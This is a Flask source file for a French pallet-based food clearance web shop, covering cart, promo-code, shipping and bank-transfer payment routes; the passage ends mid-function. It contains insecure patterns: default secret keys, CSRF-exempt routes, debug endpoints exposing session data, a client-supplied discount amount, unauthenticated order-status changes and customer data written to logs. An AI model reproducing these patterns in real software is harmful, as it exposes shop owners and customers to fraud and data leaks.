# app.py
from flask import Flask, render_template, request, redirect, url_for, flash, jsonify, session
from flask_wtf.csrf import CSRFProtect  # Maintenant ça devrait fonctionner
from extensions import db, login_manager
from flask_login import UserMixin, login_user, login_required, logout_user, current_user
from datetime import datetime, timedelta
import os
import stripe
import requests
import json
import random
from werkzeug.security import generate_password_hash, check_password_hash
from telegram_bot import send_telegram_message, test_telegram_connection, send_order_notification

app = Flask(__name__)

# Configuration
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY') or 'votre-cle-secrete-tres-securisee-2024'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///destockage.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

# Configuration CSRF - ACTIVÉ
app.config['WTF_CSRF_ENABLED'] = True
app.config['WTF_CSRF_SECRET_KEY'] = os.environ.get('WTF_CSRF_SECRET_KEY') or 'csrf-cle-secrete-2024'
app.config['WTF_CSRF_TIME_LIMIT'] = 3600  # 1 heure

# Initialisation CSRF
csrf = CSRFProtect(app)

# Configuration Stripe
app.config['STRIPE_PUBLIC_KEY'] = os.environ.get('STRIPE_PUBLIC_KEY') or 'pk_test_votre_cle'
app.config['STRIPE_SECRET_KEY'] = os.environ.get('STRIPE_SECRET_KEY') or 'sk_test_votre_cle'

# Configuration Telegram
app.config['TELEGRAM_BOT_TOKEN'] = os.environ.get('TELEGRAM_BOT_TOKEN') or 'votre_token_telegram'
app.config['TELEGRAM_CHAT_ID'] = os.environ.get('TELEGRAM_CHAT_ID') or 'votre_chat_id'

# Initialisation des extensions
db.init_app(app)
login_manager.init_app(app)
login_manager.login_view = 'connexion'
login_manager.login_message = 'Veuillez vous connecter pour accéder à cette page.'
login_manager.login_message_category = 'info'

# Import des modèles après initialisation de db
from models import Utilisateur, Produit, Categorie, Commande, CommandeItem, Paiement, Panier, Avis, Wishlist

# Configuration Stripe
stripe.api_key = app.config['STRIPE_SECRET_KEY']

# Configuration Telegram
TELEGRAM_BOT_TOKEN = app.config['TELEGRAM_BOT_TOKEN']
TELEGRAM_CHAT_ID = app.config['TELEGRAM_CHAT_ID']

# Filtres Jinja2 personnalisés
@app.template_filter('format_price')
def format_price(price):
    """Formate un prix en euros"""
    try:
        return f"{float(price):.2f} €"
    except (ValueError, TypeError):
        return "0.00 €"

@app.template_filter('format_date')
def format_date(date_string, format='%d/%m/%Y'):
    """Formate une date string en format français"""
    if not date_string:
        return ""
    try:
        if isinstance(date_string, datetime):
            return date_string.strftime(format)
        if isinstance(date_string, str):
            date_string = date_string.replace('Z', '+00:00')
            date_obj = datetime.fromisoformat(date_string)
            return date_obj.strftime(format)
        return str(date_string)
    except:
        try:
            for fmt in ['%Y-%m-%d', '%d/%m/%Y', '%d-%m-%Y', '%Y%m%d']:
                try:
                    date_obj = datetime.strptime(str(date_string), fmt)
                    return date_obj.strftime(format)
                except ValueError:
                    continue
            return str(date_string)
        except:
            return str(date_string)


# Dans app.py, après les configurations

# Configuration des codes promo
PROMO_CODES = {
    'BIENVENUE20': {
        'type': 'percentage',
        'value': 20,
        'min_purchase': 1000,
        'first_order_only': True,
        'description': '-20% sur votre première commande (dès 1000€)'
    },
    'GROS1500': {
        'type': 'percentage',
        'value': 10,
        'min_purchase': 1500,
        'description': '-10% dès 1500€ d\'achat'
    },
    'GROS2500': {
        'type': 'percentage',
        'value': 15,
        'min_purchase': 2500,
        'description': '-15% dès 2500€ d\'achat'
    },
    'GROS5000': {
        'type': 'percentage',
        'value': 20,
        'min_purchase': 5000,
        'description': '-20% dès 5000€ d\'achat'
    }
}

# Fonction de validation des codes promo
def validate_promo_code(code, total, user_id=None, is_first_order=False):
    """Valide un code promo et retourne la réduction"""
    code = code.upper().strip()
    
    if code not in PROMO_CODES:
        return {'valid': False, 'message': 'Code promo invalide'}
    
    promo = PROMO_CODES[code]
    
    # Vérifier le montant minimum
    if total < promo['min_purchase']:
        return {
            'valid': False, 
            'message': f"Ce code requiert un minimum d'achat de {promo['min_purchase']}€"
        }
    
    # Vérifier si c'est pour première commande
    if promo.get('first_order_only', False) and not is_first_order:
        return {
            'valid': False,
            'message': 'Ce code est réservé à la première commande'
        }
    
    # Calculer la réduction
    if promo['type'] == 'percentage':
        discount = total * promo['value'] / 100
    else:
        discount = promo['value']
    
    return {
        'valid': True,
        'discount': discount,
        'new_total': total - discount,
        'code': code,
        'message': f"Réduction de {promo['value']}% appliquée !"
    }

# Dans app.py, fonction de calcul des frais de port

def calculate_shipping_cost(panier_items):
    """
    Calcule les frais de port basés sur le volume/poids
    Minimum 69€ pour la livraison
    """
    if not panier_items:
        return 0
    
    # Calculer le poids total et le volume
    poids_total = 0
    volume_total = 0
    nb_palettes = 0
    
    for item in panier_items:
        produit = item['produit']
        quantite = item['quantite']
        
        # Extraire le poids (en kg)
        poids_str = produit.poids or "0 kg"
        try:
            poids = float(poids_str.split()[0])
            poids_total += poids * quantite
        except:
            pass
        
        # Compter les palettes (chaque produit est une palette)
        nb_palettes += quantite
    
    # Grille tarifaire
    if nb_palettes == 1:
        return 89.00  # 1 palette
    elif nb_palettes == 2:
        return 129.00  # 2 palettes
    elif nb_palettes == 3:
        return 169.00  # 3 palettes
    elif nb_palettes <= 5:
        return 199.00  # 4-5 palettes
    elif nb_palettes <= 8:
        return 249.00  # 6-8 palettes
    elif nb_palettes <= 12:
        return 299.00  # 9-12 palettes
    else:
        # Pour les grosses commandes, tarif personnalisé
        base = 299.00
        supplement = (nb_palettes - 12) * 25
        return base + supplement

# Dans app.py, route pour valider les codes promo

@app.route('/api/valider-code-promo', methods=['POST'])
def valider_code_promo():
    """API pour valider un code promo"""
    data = request.get_json()
    code = data.get('code')
    total = data.get('total', 0)
    
    # Vérifier si c'est une première commande (pour l'utilisateur connecté)
    is_first_order = False
    if current_user.is_authenticated:
        commandes_count = Commande.query.filter_by(utilisateur_id=current_user.id).count()
        is_first_order = commandes_count == 0
    
    result = validate_promo_code(code, total, current_user.id if current_user.is_authenticated else None, is_first_order)
    
    if result['valid']:
        # Stocker dans la session
        session['promo_code'] = {
            'code': result['code'],
            'discount': result['discount']
        }
        session.modified = True
    
    return jsonify(result)


# Dans app.py, importez le service d'email
from email_service import EmailService

email_service = EmailService()
# app.py - Correction de la route paiement_virement
# app.py - Route paiement_virement corrigée
@app.route('/paiement/virement', methods=['GET', 'POST'])
@app.route('/paiement/virement/<int:commande_id>', methods=['GET', 'POST'])
def paiement_virement(commande_id=None):
    """Paiement par virement"""
    print("=" * 80)
    print("🚀 ROUTE PAIEMENT VIREMENT - APPELÉE")
    print(f"   Méthode: {request.method}")
    print(f"   commande_id param: {commande_id}")
    print(f"   Form data: {dict(request.form)}")
    
    # Récupérer l'ID commande
    if not commande_id:
        commande_id = request.args.get('commande_id') or session.get('current_commande_id')
    
    print(f"   commande_id final: {commande_id}")
    
    if not commande_id:
        # Essayer de récupérer la dernière commande de l'utilisateur
        if current_user.is_authenticated:
            derniere_commande = Commande.query.filter_by(
                utilisateur_id=current_user.id
            ).order_by(Commande.date_creation.desc()).first()
            if derniere_commande:
                commande_id = derniere_commande.id
                print(f"   Dernière commande trouvée: {commande_id}")
        
        if not commande_id:
            flash('Veuillez d\'abord sélectionner un mode de paiement', 'warning')
            print("❌ Aucun ID commande trouvé")
            return redirect(url_for('paiement'))
    
    commande = Commande.query.get(commande_id)
    if not commande:
        print(f"❌ Commande {commande_id} non trouvée")
        flash('Commande non trouvée', 'danger')
        return redirect(url_for('paiement'))
    
    print(f"📦 Commande ID: {commande.id}")
    print(f"💰 Total final: {commande.total_final}€")
    print(f"   Statut actuel: {commande.statut}")
    
    # Récupérer les items
    items = CommandeItem.query.filter_by(commande_id=commande.id).all()
    nb_palettes = sum(item.quantite for item in items)
    
    # Préparer les données pour le template
    panier_data = []
    for item in items:
        panier_data.append({
            'produit': item.produit,
            'quantite': item.quantite,
            'prix_unitaire': item.prix_unitaire
        })
    
    # TRAITEMENT POST - Confirmation du virement
    if request.method == 'POST':
        print("📝 Traitement POST - Confirmation du virement")
        
        try:
            # Vérifier si l'utilisateur est connecté ou invité
            if not current_user.is_authenticated:
                # Pour les invités, récupérer les données du formulaire si nécessaire
                nom = request.form.get('nom')
                email = request.form.get('email')
                telephone = request.form.get('telephone')
                adresse = request.form.get('adresse')
                code_postal = request.form.get('code_postal')
                ville = request.form.get('ville')
                
                print(f"   Données invité reçues:")
                print(f"      - nom: {nom}")
                print(f"      - email: {email}")
                print(f"      - telephone: {telephone}")
                print(f"      - adresse: {adresse}")
                
                # Mettre à jour la commande si des nouvelles données sont fournies
                if nom:
                    commande.nom_client = nom
                if email:
                    commande.email_client = email
                if telephone:
                    commande.telephone_client = telephone
                if adresse and code_postal and ville:
                    commande.adresse_livraison = f"{adresse}, {code_postal} {ville}, France"
            
            # Mettre à jour le statut de la commande
            commande.statut = 'en_attente_virement'
            db.session.commit()
            print(f"✅ Statut mis à jour: {commande.statut}")
            
            # Nettoyer la session
            session.pop('current_commande_id', None)
            session.pop('panier', None)
            session.pop('panier_total', None)
            
            flash('Votre commande a été enregistrée avec succès ! Vous recevrez un email de confirmation.', 'success')
            print("✅ Redirection vers la page de confirmation")
            return redirect(url_for('confirmation', commande_id=commande.id))
            
        except Exception as e:
            db.session.rollback()
            print(f"❌ ERREUR lors de la confirmation: {e}")
            import traceback
            traceback.print_exc()
            flash(f'Erreur: {str(e)}', 'danger')
            return redirect(url_for('panier'))
    
    # GET - Afficher le formulaire
    return render_template('paiement_virement.html', 
                         commande=commande,
                         panier=panier_data,
                         total=commande.total,
                         frais_port=commande.frais_port,
                         reduction=commande.reduction,
                         total_final=commande.total_final,
                         nb_palettes=nb_palettes,
                         commande_numero=commande.numero,
                         est_connecte=current_user.is_authenticated)

# app.py - Ajoutez cette route
@app.route('/panier/contenu')
def panier_contenu():
    """API pour récupérer le contenu du panier (pour le mini-cart)"""
    panier = session.get('panier', {})
    items = []
    total = 0
    
    for produit_id, item in panier.items():
        produit = db.session.get(Produit, int(produit_id))
        if produit:
            sous_total = item['quantite'] * item['prix']
            total += sous_total
            items.append({
                'id': produit_id,
                'nom': produit.nom,
                'quantite': item['quantite'],
                'prix': f"{item['prix']:.2f} €",
                'sous_total': f"{sous_total:.2f} €",
                'image': url_for('static', filename=f"images/produits/{produit.image_principale}") if produit.image_principale else "https://via.placeholder.com/60"
            })
    
    return jsonify({
        'count': len(panier),
        'total': f"{total:.2f} €",
        'items': items
    })


def get_model_by_id(model, id_value):
    """Récupère un modèle par ID en utilisant Session.get()"""
    return db.session.get(model, id_value)



@app.template_filter('from_json')
def from_json(value):
    """Convertit une chaîne JSON en objet Python"""
    if not value:
        return {}
    try:
        return json.loads(value)
    except:
        return {}

@app.template_filter('nl2br')
def nl2br(value):
    """Convertit les retours à la ligne en <br>"""
    if not value:
        return ""
    return value.replace('\n', '<br>\n')

@app.template_filter('truncate_words')
def truncate_words(text, length=30, end='...'):
    """Tronque un texte à un nombre de mots"""
    if not text:
        return ""
    words = text.split()
    if len(words) <= length:
        return text
    return ' '.join(words[:length]) + end

# app.py - Version complète avec mise à jour automatique

def sync_with_data_file():
    """Synchronise automatiquement la base avec data.py"""
    from data import categories as data_categories, products as data_products
    import json
    
    print("🔄 Synchronisation avec data.py...")
    
    # 1. Synchroniser les catégories
    categories_ids = []
    for cat_data in data_categories:
        # Utiliser db.session.get() au lieu de Categorie.query.get()
        categorie = db.session.get(Categorie, cat_data["id"])
        if categorie:
            # Mise à jour
            categorie.nom = cat_data["nom"]
            categorie.description = cat_data["description"]
            categorie.ordre = cat_data["ordre"]
        else:
            # Création
            categorie = Categorie(
                id=cat_data["id"],
                nom=cat_data["nom"],
                description=cat_data["description"],
                ordre=cat_data["ordre"]
            )
            db.session.add(categorie)
            print(f"➕ Nouvelle catégorie: {cat_data['nom']}")
        
        categories_ids.append(cat_data["id"])
    
    # Supprimer les catégories qui ne sont plus dans data.py
    # Utiliser db.session.execute() pour récupérer toutes les catégories
    all_categories = db.session.execute(db.select(Categorie)).scalars().all()
    for cat in all_categories:
        if cat.id not in categories_ids:
            db.session.delete(cat)
            print(f"➖ Catégorie supprimée: {cat.nom}")
    
    db.session.commit()
    
    # 2. Synchroniser les produits
    produits_ids = []
    for prod_data in data_products:
        # Utiliser db.session.get() au lieu de Produit.query.get()
        produit = db.session.get(Produit, prod_data["id"])
        if produit:
            # Mise à jour
            produit.nom = prod_data["nom"]
            produit.description = prod_data["description"]
            produit.prix = prod_data["prix"]
            produit.prix_promo = prod_data.get("prix_promo")
            produit.stock = prod_data.get("stock", 0)
            produit.en_promotion = prod_data.get("en_promotion", False)
            produit.meilleure_vente = prod_data.get("meilleure_vente", False)
            produit.image_principale = prod_data.get("images", ["default.jpg"])[0] if prod_data.get("images") else "default.jpg"
            # Mettre à jour la catégorie
            if "categorie_id" in prod_data:
                produit.categorie_id = prod_data["categorie_id"]
        else:
            # Création
            produit = Produit(
                id=prod_data["id"],
                nom=prod_data["nom"],
                description=prod_data["description"],
                prix=prod_data["prix"],
                prix_promo=prod_data.get("prix_promo"),
                categorie_id=prod_data["categorie_id"],
                stock=prod_data.get("stock", 0),
                image_principale=prod_data.get("images", ["default.jpg"])[0] if prod_data.get("images") else "default.jpg",
                en_promotion=prod_data.get("en_promotion", False),
                meilleure_vente=prod_data.get("meilleure_vente", False),
                actif=True
            )
            db.session.add(produit)
            print(f"➕ Nouveau produit: {prod_data['nom']}")
        
        produits_ids.append(prod_data["id"])
    
    # Supprimer les produits qui ne sont plus dans data.py
    all_products = db.session.execute(db.select(Produit)).scalars().all()
    for prod in all_products:
        if prod.id not in produits_ids:
            db.session.delete(prod)
            print(f"➖ Produit supprimé: {prod.nom}")
    
    db.session.commit()
    print("✅ Synchronisation terminée")
    
@login_manager.user_loader
def load_user(user_id):
    return Utilisateur.query.get(int(user_id))

# Routes principales
@app.route('/')
def index():
    """Page d'accueil"""
    produits_populaires = Produit.query.filter_by(actif=True).order_by(Produit.views.desc()).limit(8).all()
    categories = Categorie.query.order_by(Categorie.ordre).all()
    
    # Vérifier si un popup promotion doit être affiché
    show_promo_popup = session.get('show_promo_popup', True)
    if show_promo_popup:
        session['show_promo_popup'] = False
    
    return render_template('index.html', 
                         produits=produits_populaires,
                         categories=categories,
                         show_promo=show_promo_popup)

@app.route('/produits')
def produits():
    """Page liste des produits"""
    # Récupération des paramètres
    page = request.args.get('page', 1, type=int)
    per_page = request.args.get('per_page', 12, type=int)
    categorie_id = request.args.get('categorie', type=int)
    min_price = request.args.get('min_price', type=float)
    max_price = request.args.get('max_price', type=float)
    in_stock = request.args.get('in_stock', type=str)
    promo = request.args.get('promo', type=str)
    sort = request.args.get('sort', 'popularite')
    
    # Debug - Afficher dans la console
    print(f"=== FILTRES RECUS ===")
    print(f"min_price: {min_price}")
    print(f"max_price: {max_price}")
    print(f"in_stock: {in_stock}")
    print(f"promo: {promo}")
    print(f"categorie: {categorie_id}")
    print(f"sort: {sort}")
    print(f"page: {page}")
    
    query = Produit.query.filter_by(actif=True)
    
    # Appliquer les filtres
    if categorie_id:
        query = query.filter_by(categorie_id=categorie_id)
        print(f"Filtre categorie appliqué: {categorie_id}")
    
    if min_price is not None:
        query = query.filter(Produit.prix >= min_price)
        print(f"Filtre prix min appliqué: >= {min_price}")
    
    if max_price is not None:
        query = query.filter(Produit.prix <= max_price)
        print(f"Filtre prix max appliqué: <= {max_price}")
    
    if in_stock == '1':
        query = query.filter(Produit.stock > 0)
        print(f"Filtre stock appliqué: > 0")
    
    if promo == '1':
        query = query.filter(Produit.prix_promo.isnot(None))
        print(f"Filtre promo appliqué")
    
    # Appliquer le tri
    if sort == 'prix-croissant':
        query = query.order_by(Produit.prix.asc())
    elif sort == 'prix-decroissant':
        query = query.order_by(Produit.prix.desc())
    elif sort == 'nouveaute':
        query = query.order_by(Produit.date_creation.desc())
    else:
        query = query.order_by(Produit.views.desc())
    
    # Pagination
    produits = query.paginate(page=page, per_page=per_page, error_out=False)
    
    print(f"Nombre de produits trouvés: {produits.total}")
    
    # Récupérer les catégories avec leurs produits
    categories = Categorie.query.all()
    for cat in categories:
        cat.produits = Produit.query.filter_by(categorie_id=cat.id, actif=True).all()
    
    # Prix max réel pour le slider
    prix_max_reel = db.session.query(db.func.max(Produit.prix)).filter_by(actif=True).scalar() or 20000
    
    return render_template('produits.html', 
                         produits=produits,
                         categories=categories,
                         categorie_active=categorie_id,
                         per_page=per_page,
                         prix_max_reel=prix_max_reel)

@app.route('/api/panier')
def api_panier():
    """API pour récupérer le panier en JSON"""
    panier_data = []
    total = 0
    
    for produit_id, item in session.get('panier', {}).items():
        produit = Produit.query.get(int(produit_id))
        if produit:
            sous_total = item['quantite'] * item['prix']
            total += sous_total
            panier_data.append({
                'id': produit.id,
                'nom': produit.nom,
                'image': url_for('static', filename='images/produits/' + produit.image_principale) if produit.image_principale else '',
                'prix': item['prix'],
                'quantite': item['quantite'],
                'sous_total': sous_total
            })
    
    return jsonify({
        'items': panier_data,
        'total': total,
        'nb_articles': len(panier_data)
    })

def slugify(text):
    """Convertit un texte en slug URL-friendly"""
    import re
    from unidecode import unidecode
    text = unidecode(str(text).lower())
    text = re.sub(r'[^a-z0-9]+', '-', text)
    return text.strip('-')
    
@app.route('/produit/<int:produit_id>')
@app.route('/produit/<int:produit_id>-<string:slug>')
def produit_detail(produit_id, slug=None):
    """Page détail d'un produit avec URL SEO friendly"""
    produit = Produit.query.get_or_404(produit_id)
    
    # Générer le slug du produit
    from sitemap import slugify
    produit_slug = slugify(produit.nom)
    
    # Rediriger vers l'URL avec slug si nécessaire
    if not slug or slug != produit_slug:
        return redirect(url_for('produit_detail', produit_id=produit_id, slug=produit_slug), 301)
    
    # Incrémenter le compteur de vues
    produit.views += 1
    db.session.commit()
    
    # Produits similaires
    produits_similaires = Produit.query.filter_by(
        categorie_id=produit.categorie_id, 
        actif=True
    ).filter(Produit.id != produit.id).limit(4).all()
    
    # Récupérer les avis
    avis = Avis.query.filter_by(produit_id=produit.id).order_by(Avis.date_creation.desc()).all()
    
    # Meta tags SEO
    meta_title = f"{produit.nom} - Destock Alimentaire"
    meta_description = produit.description[:160] if produit.description else f"Achetez {produit.nom} au meilleur prix sur Destock Alimentaire. Livraison rapide partout en France."
    
    return render_template('produit.html', 
                         produit=produit,
                         similaires=produits_similaires,
                         avis=avis,
                         meta_title=meta_title,
                         meta_description=meta_description)





@app.route('/api/paiement/virement/confirmer', methods=['POST'])
def api_confirmer_virement():
    """API pour confirmer un virement"""
    try:
        data = request.get_json()
        commande_id = data.get('commande_id')
        
        if not commande_id:
            return jsonify({'success': False, 'error': 'ID commande manquant'}), 400
        
        commande = Commande.query.get(commande_id)
        if not commande:
            return jsonify({'success': False, 'error': 'Commande non trouvée'}), 404
        
        # Mettre à jour le statut
        commande.statut = 'en_attente_virement'
        db.session.commit()
        
        return jsonify({'success': True, 'redirect': url_for('confirmation', commande_id=commande_id)})
    
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/panier/count')
def api_panier_count():
    """API pour récupérer le nombre d'articles dans le panier"""
    panier = session.get('panier', {})
    return jsonify({'count': len(panier)})

@app.route('/panier')
def panier():
    """Afficher le panier"""
    panier_data = []
    total = 0
    
    for produit_id, item in session.get('panier', {}).items():
        produit = Produit.query.get(int(produit_id))
        if produit:
            sous_total = item['quantite'] * item['prix']
            total += sous_total
            panier_data.append({
                'produit': produit,
                'quantite': item['quantite'],
                'prix': item['prix'],
                'sous_total': sous_total
            })
    
    # Suggestions de produits
    suggestions = Produit.query.filter_by(actif=True).order_by(Produit.views.desc()).limit(4).all()
    
    return render_template('panier.html', 
                         panier=panier_data,
                         total=total,
                         suggestions=suggestions)

@app.route('/panier/modifier/<int:produit_id>', methods=['POST'])
@csrf.exempt
def modifier_panier(produit_id):
    """Modifier la quantité d'un produit dans le panier"""
    try:
        print("=" * 60)
        print(f"🔄 MODIFICATION - Produit ID: {produit_id}")
        print(f"   Content-Type: {request.headers.get('Content-Type')}")
        
        # Récupérer les données JSON
        if request.is_json:
            data = request.get_json()
        else:
            # Fallback pour form data
            data = request.form.to_dict()
        
        print(f"   Données reçues: {data}")
        
        quantite = data.get('quantite', 1)
        if isinstance(quantite, str):
            quantite = int(quantite)
        
        print(f"   Quantité demandée: {quantite}")
        
        # Vérifier si le produit existe
        produit = Produit.query.get(produit_id)
        if not produit:
            print(f"❌ Produit ID {produit_id} non trouvé")
            return jsonify({'success': False, 'error': 'Produit non trouvé'}), 404
        
        print(f"   Produit: {produit.nom}, stock: {produit.stock}")
        
        if quantite > produit.stock:
            return jsonify({'success': False, 'error': f'Stock insuffisant. Max: {produit.stock}'}), 400
        
        # Récupérer le panier
        panier = session.get('panier', {})
        print(f"   Panier avant: {panier}")
        
        produit_key = str(produit_id)
        
        if produit_key not in panier:
            return jsonify({'success': False, 'error': 'Produit non trouvé dans le panier'}), 404
        
        if quantite <= 0:
            del panier[produit_key]
            print(f"   Produit supprimé")
        else:
            panier[produit_key]['quantite'] = quantite
            print(f"   Quantité mise à jour: {quantite}")
        
        # Sauvegarder
        session['panier'] = panier
        session.modified = True
        
        # Recalculer le total
        total = 0
        for item in panier.values():
            total += item['quantite'] * item['prix']
        
        session['panier_total'] = total
        
        print(f"   Panier après: {panier}")
        print(f"   Nouveau total: {total}€")
        print("=" * 60)
        
        return jsonify({
            'success': True,
            'total_panier': total,
            'nb_articles': len(panier)
        })
        
    except Exception as e:
        print(f"❌ ERREUR: {e}")
        import traceback
        traceback.print_exc()
        return jsonify({'success': False, 'error': str(e)}), 500

# app.py - Ajoutez cette route pour voir ce qui se passe
@app.route('/debug/test-paiement', methods=['GET', 'POST'])
@csrf.exempt 
def debug_test_paiement():
    """Route de test pour le paiement"""
    if request.method == 'POST':
        print("=" * 60)
        print("🔍 TEST PAIEMENT - Formulaire reçu")
        print(f"   Données: {dict(request.form)}")
        print("=" * 60)
        return "Formulaire reçu ! Vérifiez les logs."
    
    return '''
    <form method="POST">
        <button type="submit">Tester le paiement</button>
    </form>
    '''
# app.py - Remplacez complètement la route supprimer_panier par celle-ci
@app.route('/panier/supprimer/<int:produit_id>', methods=['POST'])
@csrf.exempt 
def supprimer_panier(produit_id):
    """Supprimer un produit du panier"""
    try:
        print("=" * 60)
        print(f"🗑️ SUPPRESSION - Produit ID: {produit_id} (type: {type(produit_id)})")
        
        # Récupérer le panier
        panier = session.get('panier', {})
        print(f"   Panier actuel: {panier}")
        print(f"   Clés du panier: {list(panier.keys())}")
        
        # Convertir en string pour la clé (car les clés sont des strings dans la session)
        produit_key = str(produit_id)
        
        # Vérifier si le produit est dans le panier
        if produit_key not in panier:
            print(f"⚠️ Produit {produit_id} non trouvé dans le panier")
            print(f"   IDs disponibles: {list(panier.keys())}")
            return jsonify({
                'success': False, 
                'error': f'Produit ID {produit_id} non trouvé. IDs disponibles: {list(panier.keys())}',
                'available_ids': list(panier.keys())
            }), 404
        
        # Supprimer le produit
        deleted_item = panier.pop(produit_key)
        print(f"✅ Produit supprimé: {deleted_item}")
        
        # Sauvegarder le panier
        session['panier'] = panier
        session.modified = True
        
        # Recalculer le total
        total = 0
        for item in panier.values():
            total += item['quantite'] * item['prix']
        
        session['panier_total'] = total
        
        print(f"   Nouveau panier: {panier}")
        print(f"   Nouveau total: {total}€")
        print(f"   Nombre d'articles: {len(panier)}")
        print("=" * 60)
        
        return jsonify({
            'success': True, 
            'total_panier': total,
            'nb_articles': len(panier)
        })
        
    except Exception as e:
        print(f"❌ ERREUR lors de la suppression: {e}")
        import traceback
        traceback.print_exc()
        return jsonify({'success': False, 'error': str(e)}), 500

# app.py - Route alternative avec méthode GET pour debug
@app.route('/panier/supprimer-test/<int:produit_id>', methods=['GET'])
def supprimer_panier_test(produit_id):
    """Route de test pour la suppression (GET)"""
    try:
        panier = session.get('panier', {})
        produit_key = str(produit_id)
        
        if produit_key in panier:
            del panier[produit_key]
            session['panier'] = panier
            session.modified = True
            
            total = sum(item['quantite'] * item['prix'] for item in panier.values())
            session['panier_total'] = total
            
            return jsonify({
                'success': True,
                'message': f'Produit {produit_id} supprimé',
                'new_total': total
            })
        else:
            return jsonify({
                'success': False,
                'error': f'Produit {produit_id} non trouvé',
                'available_ids': list(panier.keys())
            }), 404
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

# app.py - Route de debug pour voir le panier
@app.route('/debug/panier')
def debug_panier():
    """Route de debug pour voir le contenu du panier"""
    panier = session.get('panier', {})
    return jsonify({
        'panier': panier,
        'panier_total': session.get('panier_total', 0),
        'session_keys': list(session.keys())
    })

@app.route('/debug/panier/vider', methods=['POST'])
def debug_vider_panier():
    """Route pour vider le panier (debug)"""
    session['panier'] = {}
    session['panier_total'] = 0
    session.modified = True
    return jsonify({'success': True, 'message': 'Panier vidé'})

@app.route('/panier/vider', methods=['POST'])
@csrf.exempt  # Ajoutez temporairement pour tester
def vider_panier():
    """Vider le panier"""
    try:
        print("=" * 60)
        print("🗑️ VIDER LE PANIER - Appelé")
        
        # Vider le panier
        session['panier'] = {}
        session['panier_total'] = 0
        session.pop('promo_code', None)
        session.pop('nb_palettes', None)
        session.pop('frais_port', None)
        session.modified = True
        
        print("✅ Panier vidé avec succès")
        print("=" * 60)
        
        return jsonify({
            'success': True, 
            'message': 'Panier vidé avec succès'
        })
        
    except Exception as e:
        print(f"❌ Erreur lors du vidage du panier: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500
@app.route('/panier/compteur')
def panier_compteur():
    """Retourne le nombre d'articles dans le panier"""
    panier = session.get('panier', {})
    return jsonify({'count': len(panier)})

# Routes de paiement
@app.route('/paiement', methods=['GET', 'POST'])
def paiement():
    """Page de paiement - NE CREE PAS LA COMMANDE"""
    if not session.get('panier'):
        flash('Votre panier est vide', 'warning')
        return redirect(url_for('panier'))
    
    # Calculer le total et les frais de port
    total = 0
    nb_palettes = 0
    panier_data = []
    panier_json = []
    
    for produit_id, item in session.get('panier', {}).items():
        produit = db.session.get(Produit, int(produit_id))
        if produit:
            sous_total = item['quantite'] * item['prix']
            total += sous_total
            nb_palettes += item['quantite']
            
            panier_data.append({
                'produit': produit,
                'quantite': item['quantite']
            })
            
            panier_json.append({
                'produit': {
                    'id': produit.id,
                    'nom': produit.nom,
                    'prix': float(produit.prix),
                    'prix_promo': float(produit.prix_promo) if produit.prix_promo else None,
                },
                'quantite': item['quantite']
            })
    
    # Calculer les frais de port
    frais_port = calculate_shipping_cost(nb_palettes)
    
    # Stocker en session pour paiement_process
    session['panier_total'] = total
    session['nb_palettes'] = nb_palettes
    session['frais_port'] = frais_port
    
    if request.method == 'POST':
        # Rediriger vers paiement_process
        return redirect(url_for('paiement_process'))
    
    return render_template('paiement.html', 
                         panier=panier_data,
                         panier_json=panier_json,
                         total=total,
                         nb_palettes=nb_palettes,
                         frais_port=frais_port,
                         est_connecte=current_user.is_authenticated)

@app.route('/paiement/process', methods=['POST'])
@csrf.exempt 
def paiement_process():
    """Traite le paiement après sélection du mode"""
    print("=" * 80)
    print("🚀 ROUTE PAIEMENT_PROCESS - APPELÉE")
    print(f"   Méthode: {request.method}")
    print(f"   Form data: {dict(request.form)}")
    
    # Récupérer le mode de paiement
    mode_paiement = request.form.get('payment_method')
    discount_amount = float(request.form.get('discount_amount', 0))
    promo_code_used = request.form.get('promo_code_used', '')
    
    print(f"   Mode de paiement: {mode_paiement}")
    print(f"   Réduction: {discount_amount}€")
    print(f"   Code promo: {promo_code_used}")
    
    # Vérifier que le panier existe
    panier = session.get('panier')
    if not panier:
        flash('Votre panier est vide', 'warning')
        print("❌ Panier vide")
        return redirect(url_for('panier'))
    
    print(f"   Panier: {panier}")
    
    # Récupérer les infos client (invité ou connecté)
    if current_user.is_authenticated:
        print(f"👤 Utilisateur connecté: {current_user.email}")
        
        email = current_user.email
        nom = f"{current_user.prenom} {current_user.nom}"
        telephone = current_user.telephone
        
        # Gérer l'adresse pour l'utilisateur connecté
        if current_user.adresse:
            if current_user.code_postal and current_user.ville:
                adresse_complete = f"{current_user.adresse}, {current_user.code_postal} {current_user.ville}, {current_user.pays or 'France'}"
            else:
                adresse_complete = current_user.adresse
            print(f"   Adresse utilisateur: {adresse_complete}")
        else:
            flash('Veuillez compléter votre adresse dans votre profil avant de commander', 'warning')
            print("❌ Utilisateur connecté sans adresse")
            return redirect(url_for('compte_profil'))
        
        utilisateur_id = current_user.id
        
    else:
        print("👤 Utilisateur invité")
        
        # Récupérer depuis le formulaire
        email = request.form.get('email')
        nom = request.form.get('nom')
        telephone = request.form.get('telephone')
        adresse = request.form.get('adresse')
        code_postal = request.form.get('code_postal')
        ville = request.form.get('ville')
        pays = request.form.get('pays', 'France')
        utilisateur_id = None
        
        # Afficher les valeurs reçues
        print(f"   📝 Données reçues:")
        print(f"      - nom: '{nom}'")
        print(f"      - email: '{email}'")
        print(f"      - telephone: '{telephone}'")
        print(f"      - adresse: '{adresse}'")
        print(f"      - code_postal: '{code_postal}'")
        print(f"      - ville: '{ville}'")
        print(f"      - pays: '{pays}'")
        
        # Vérifier les champs obligatoires
        required_fields = [nom, email, telephone, adresse, code_postal, ville]
        field_names = ['nom', 'email', 'téléphone', 'adresse', 'code postal', 'ville']
        
        missing_fields = []
        for i, field in enumerate(required_fields):
            if not field or not str(field).strip():
                missing_fields.append(field_names[i])
        
        if missing_fields:
            print(f"❌ Champs obligatoires manquants: {', '.join(missing_fields)}")
            flash(f'Veuillez remplir tous les champs obligatoires: {", ".join(missing_fields)}', 'danger')
            return redirect(url_for('paiement'))
        
        # Construire l'adresse complète
        adresse_complete = f"{adresse.strip()}, {code_postal.strip()} {ville.strip()}, {pays}"
        print(f"   Adresse complète: {adresse_complete}")
    
    # Calculer le total et les frais de port
